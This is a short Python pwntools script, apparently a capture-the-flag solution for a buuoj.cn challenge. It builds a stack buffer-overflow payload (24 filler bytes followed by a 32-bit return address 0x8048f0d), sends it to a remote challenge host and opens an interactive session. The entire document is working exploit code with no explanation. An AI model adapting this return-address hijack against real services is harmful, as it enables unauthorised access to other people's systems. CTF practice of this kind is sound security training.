from pwn import *

payload = 'I' * 20 + 'a' * 4;

payload += p32(0x8048f0d)

p = remote('node3.buuoj.cn', 27226)

p.sendline(payload)

p.interactive()
